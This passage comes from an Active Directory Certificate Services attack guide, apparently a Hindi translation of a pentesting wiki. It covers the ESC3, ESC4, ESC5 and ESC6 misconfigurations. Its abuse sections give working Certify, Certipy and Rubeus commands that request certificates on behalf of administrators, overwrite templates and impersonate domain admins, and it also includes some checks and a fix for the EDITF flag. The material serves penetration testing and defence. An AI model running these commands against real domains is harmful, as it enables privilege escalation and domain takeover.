4. рдПрдХ рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдг рдХрдо-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдЕрдзрд┐рдХрд╛рд░ рджреЗрддрд╛ рд╣реИ.
5. **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯ Certificate Request Agent EKU рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ**. Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) рджреВрд╕рд░реЗ рд╕рд┐рджреНрдзрд╛рдВрддреЛрдВ рдХреА рдУрд░ рд╕реЗ рдЕрдиреНрдп рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ.

**рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ 2:**

1. Enterprise CA рдХрдо-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдЕрдзрд┐рдХрд╛рд░ рджреЗрддрд╛ рд╣реИ.
2. рдореИрдиреЗрдЬрд░ рдЕрдиреБрдореЛрджрди рдЕрдХреНрд╖рдо рд╣реИ.
3. **рдЯреЗрдореНрдкреНрд▓реЗрдЯ рд╕реНрдХреАрдорд╛ рд╕рдВрд╕реНрдХрд░рдг 1 рд╣реИ рдпрд╛ 2 рд╕реЗ рдЕрдзрд┐рдХ рд╣реИ рдФрд░ рдПрдХ Application Policy Issuance Requirement рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ Certificate Request Agent EKU рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ.**
4. рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдПрдХ EKU рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ.
5. CA рдкрд░ Enrollment agent рдкреНрд░рддрд┐рдмрдВрдз рд▓рд╛рдЧреВ рдирд╣реАрдВ рдХрд┐рдП рдЧрдП рд╣реИрдВ.

### рджреБрд░реБрдкрдпреЛрдЧ

рдЖрдк рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**Certify**](https://github.com/GhostPack/Certify) рдпрд╛ [**Certipy**](https://github.com/ly4k/Certipy) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬрд╝ рд╕реАрдП рдЙрди **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ** рдХреЛ **рд╕реАрдорд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдПрдЬреЗрдВрдЯреНрд╕ рдХрд┐рди рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕ рдореЗрдВ рдПрдирд░реЛрд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдХрд┐рди **рдЦрд╛рддреЛрдВ** рдХреА рдУрд░ рд╕реЗ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ **рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдпрд╣ `certsrc.msc` `snap-in -> рджрд╛рдпрд╛рдБ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ рд╕реАрдП рдкрд░ -> Properties рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ -> тАЬEnrollment AgentsтАЭ рдЯреИрдм рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдХреЗ` рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕реАрдП рдХреА **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд╕реЗрдЯрд┐рдВрдЧ рд╣реИ тАЬ**рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреНрд╕ рдХреЛ рд╕реАрдорд┐рдд рди рдХрд░реЗрдВ**тАЭ. рдЬрдм рдкреНрд░рд╢рд╛рд╕рдХ тАЬрдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреНрд╕ рдХреЛ рд╕реАрдорд┐рдд рдХрд░реЗрдВтАЭ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВ, рддрдм рднреА рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧ рдмрд╣реБрдд рдЕрдзрд┐рдХ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реА рд╣реЛрддреА рд╣реИ, рдЬреЛ рд╕рднреА рдХреЛ рд╕рднреА рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕ рдореЗрдВ рдХрд┐рд╕реА рдХреЗ рд░реВрдк рдореЗрдВ рдПрдирд░реЛрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

## рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдПрдХреНрд╕реЗрд╕ рдХрдВрдЯреНрд░реЛрд▓ - ESC4

### **рд╡реНрдпрд╛рдЦреНрдпрд╛**

**рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕** рдореЗрдВ рдПрдХ **рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдгрдХ** рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕реЗ AD **рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕** рдХреЗ рдкрд╛рд╕ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдкрд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ **рдЕрдиреБрдорддрд┐рдпрд╛рдВ** рд╣реИрдВред

рдпрджрд┐ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд **рдЕрдиреБрдорддрд┐рдпрд╛рдВ** рд╣реИрдВ рддреЛ рд╡рд╣ рдПрдХ **рдЯреЗрдореНрдкреНрд▓реЗрдЯ** рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рдкрд┐рдЫрд▓реЗ рдЦрдВрдбреЛрдВ** рд╕реЗ рдХрд┐рд╕реА рднреА рд╢реЛрд╖рдг рдпреЛрдЧреНрдп **рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдХреЛ **рдмрдирд╛** рд╕рдХрддрд╛ рд╣реИ, рд╡рд╣ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░** рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕ рдкрд░ рджрд┐рд▓рдЪрд╕реНрдк рдЕрдзрд┐рдХрд╛рд░:

* **Owner:** рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░ рдирд┐рд╣рд┐рдд рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг, рдХрд┐рд╕реА рднреА рдЧреБрдгрдзрд░реНрдо рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* **FullControl:** рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг, рдХрд┐рд╕реА рднреА рдЧреБрдгрдзрд░реНрдо рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* **WriteOwner:** рд╣рдорд▓рд╛рд╡рд░-рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рдорд╛рд▓рд┐рдХ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* **WriteDacl:** рдПрдХреНрд╕реЗрд╕ рдХрдВрдЯреНрд░реЛрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ FullControl рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* **WriteProperty:** рдХрд┐рд╕реА рднреА рдЧреБрдгрдзрд░реНрдо рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ

### рджреБрд░реБрдкрдпреЛрдЧ

рдкрд┐рдЫрд▓реЗ рдЬреИрд╕реЗ рдПрдХ privesc рдХрд╛ рдЙрджрд╛рд╣рд░рдг:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 рддрдм рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реЛрддреА рд╣реИрдВред рдЗрд╕реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП ESC1 рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЬреИрд╕рд╛ рдХрд┐ рд╣рдо рдКрдкрд░ рдХреЗ рдкрде рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдХреЗрд╡рд▓ `JOHNPC` рдХреЗ рдкрд╛рд╕ рдпреЗ рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реИрдВ, рд▓реЗрдХрд┐рди рд╣рдорд╛рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `JOHN` рдХреЗ рдкрд╛рд╕ `JOHNPC` рдХреЗ рд▓рд┐рдП рдирдпрд╛ `AddKeyCredentialLink` рдПрдЬ рд╣реИред рдЪреВрдВрдХрд┐ рдпрд╣ рддрдХрдиреАрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ, рдореИрдВрдиреЗ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рднреА рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рд╣реИ, рдЬрд┐рд╕реЗ [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣рд╛рдБ рдкреАрдбрд╝рд┐рдд рдХреЗ NT рд╣реИрд╢ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Certipy рдХреЗ `shadow auto` рдХрдорд╛рдВрдб рдХреА рдПрдХ рдЫреЛрдЯреА рдЭрд▓рдХ рд╣реИред

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Certipy** рдПрдХрд▓ рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рд╕реЗ, Certipy рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ ESC1 рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░реЗрдЧрд╛ред рд╣рдо **`-save-old` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рднреА рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдкреБрд░рд╛рдиреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рд╕рд╣реЗрдЬрд╛ рдЬрд╛ рд╕рдХреЗ**, рдЬреЛ рд╣рдорд╛рд░реЗ рд╣рдорд▓реЗ рдХреЗ рдмрд╛рдж рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ **рдкреБрдирдГ рд╕реНрдерд╛рдкрд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрдЧрд╛ред
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### рд╡реНрдпрд╛рдЦреНрдпрд╛

AD CS рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ ACL рдЖрдзрд╛рд░рд┐рдд рд╕рдВрдмрдВрдзреЛрдВ рдХрд╛ рдЬрд╛рд▓ рд╡реНрдпрд╛рдкрдХ рд╣реИред рдХрдИ **рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ** рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕ рдФрд░ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЕрдереЙрд░рд┐рдЯреА рдХреЗ рдмрд╛рд╣рд░ рднреА **рдкреВрд░реЗ AD CS рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рднрд╛рд╡** рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред рдЗрди рд╕рдВрднрд╛рд╡рдирд╛рдУрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ (рд▓реЗрдХрд┐рди рд╕реАрдорд┐рдд рдирд╣реАрдВ рд╣реИрдВ):

* **CA рд╕рд░реНрд╡рд░ рдХрд╛ AD рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯ** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, S4U2Self рдпрд╛ S4U2Proxy рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдордЭреМрддрд╛)
* **CA рд╕рд░реНрд╡рд░ рдХрд╛ RPC/DCOM рд╕рд░реНрд╡рд░**
* рдХреЛрдИ рднреА **рд╡рдВрд╢рдЬ AD рдСрдмреНрдЬреЗрдХреНрдЯ рдпрд╛ рдХрдВрдЯреЗрдирд░** `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` рдореЗрдВ (рдЬреИрд╕реЗ, рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕ рдХрдВрдЯреЗрдирд░, рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрд╢рди рдЕрдереЙрд░рд┐рдЯреАрдЬ рдХрдВрдЯреЗрдирд░, NTAuthCertificates рдСрдмреНрдЬреЗрдХреНрдЯ, рдПрдирд░реЛрд▓рдореЗрдВрдЯ рд╕рд░реНрд╡рд┐рд╕реЗрдЬ рдХрдВрдЯреЗрдирд░, рдЖрджрд┐ред)

рдпрджрд┐ рдХрдо-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛рд╡рд░ рдЗрдирдореЗрдВ рд╕реЗ **рдХрд┐рд╕реА рдкрд░ рднреА рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**, рддреЛ рд╣рдорд▓рд╛ рд╢рд╛рдпрдж **PKI рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### рд╡реНрдпрд╛рдЦреНрдпрд╛

рдПрдХ рдФрд░ рд╕рдорд╛рди рдореБрджреНрджрд╛ рд╣реИ, рдЬрд┐рд╕реЗ [**CQure Academy рдкреЛрд╕реНрдЯ**](https://cqureacademy.com/blog/enhanced-key-usage) рдореЗрдВ рд╡рд░реНрдгрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ **`EDITF_ATTRIBUTESUBJECTALTNAME2`** рдлреНрд▓реИрдЧ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИред рдЬреИрд╕рд╛ рдХрд┐ Microsoft рд╡рд░реНрдгрди рдХрд░рддрд╛ рд╣реИ, тАЬ**рдпрджрд┐** рдпрд╣ рдлреНрд▓реИрдЧ CA рдкрд░ **рд╕реЗрдЯ** рд╣реИ, рддреЛ **рдХреЛрдИ рднреА рдЕрдиреБрд░реЛрдз** (рдЬрдм рд╕рдмреНрдЬреЗрдХреНрдЯ Active Directory┬о рд╕реЗ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реЛ) рдореЗрдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдорд╛рди** **рд╕рдмреНрдЬреЗрдХреНрдЯ рдЕрд▓реНрдЯрд░рдиреЗрдЯрд┐рд╡ рдирд╛рдо** рдореЗрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВредтАЭ\
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдбреЛрдореЗрди **рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП **рдХрд┐рд╕реА рднреА рдЯреЗрдореНрдкреНрд▓реЗрдЯ** рдореЗрдВ рдирд╛рдорд╛рдВрдХрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдпрд╣ рднреА **рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдХрд┐ рдЕрд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдорд╛рдВрдХрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдпреВрдЬрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯ) рдФрд░ **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рд╣рдореЗрдВ рдбреЛрдореЗрди рдПрдбрдорд┐рди (рдпрд╛ **рдХрд┐рд╕реА рдЕрдиреНрдп рд╕рдХреНрд░рд┐рдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рдорд╢реАрди**) рдХреЗ рд░реВрдк рдореЗрдВ **рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**ред

**рдиреЛрдЯ**: рдпрд╣рд╛рдБ **рдЕрд▓реНрдЯрд░рдиреЗрдЯрд┐рд╡ рдирд╛рдо** `certreq.exe` рдХреЗ `-attrib "SAN:"` рддрд░реНрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ CSR рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рдХрд┐рдП рдЧрдП рд╣реИрдВ** (рдЕрд░реНрдерд╛рддреН, тАЬName Value PairsтАЭ)ред рдпрд╣ ESC1 рдореЗрдВ **SANs рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐ рд╕реЗ рднрд┐рдиреНрди** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рдЦрд╛рддрд╛ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд╡рд┐рд╢реЗрд╖рддрд╛ рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд░рддрд╛ рд╣реИ рдмрдирд╛рдо рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдореЗрдВ**ред

### рджреБрд░реБрдкрдпреЛрдЧ

рд╕рдВрдЧрдарди рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд `certutil.exe` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╕реЗрдЯрд┐рдВрдЧ рд╕рдХреНрд╖рдо рд╣реИ рдпрд╛ рдирд╣реАрдВ**:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
рдиреАрдЪреЗ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╣ рд╕рд┐рд░реНрдл **remote** **registry** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рднреА рдХрд╛рдо рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) рдФрд░ [**Certipy**](https://github.com/ly4k/Certipy) рднреА рдЗрд╕рдХреА рдЬрд╛рдВрдЪ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
рдпреЗ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ **рд╕реЗрдЯ** рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдорд╛рди рд▓реЗрдВ рдХрд┐ **рдбреЛрдореЗрди рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ** (рдпрд╛ рд╕рдордХрдХреНрд╖) рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрдВ, рдХрд┐рд╕реА рднреА рд╕рд┐рд╕реНрдЯрдо рд╕реЗ:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
рдпрджрд┐ рдЖрдкрдХреЛ рдЕрдкрдиреЗ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдЖрдк **рдЗрд╕ рдлреНрд▓реИрдЧ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЗрд╕рдХреЗ рд╕рд╛рде:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
рдордИ 2022 рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдЕрдкрдбреЗрдЯ рдХреЗ рдмрд╛рдж, рдирдП **рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ** рдореЗрдВ рдПрдХ **рд╕реБрд░рдХреНрд╖рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рд╣реЛрдЧрд╛ рдЬреЛ **рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХреА `objectSid` рд╕рдВрдкрддреНрддрд┐** рдХреЛ **рд╕рдореНрдорд┐рд▓рд┐рдд** рдХрд░реЗрдЧрд╛ред ESC1 рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╕рдВрдкрддреНрддрд┐ SAN рд╕реЗ рдкрд░рд┐рд▓рдХреНрд╖рд┐рдд рд╣реЛрдЧреА, рд▓реЗрдХрд┐рди **ESC6** рдХреЗ рд╕рд╛рде, рдпрд╣ рд╕рдВрдкрддреНрддрд┐ 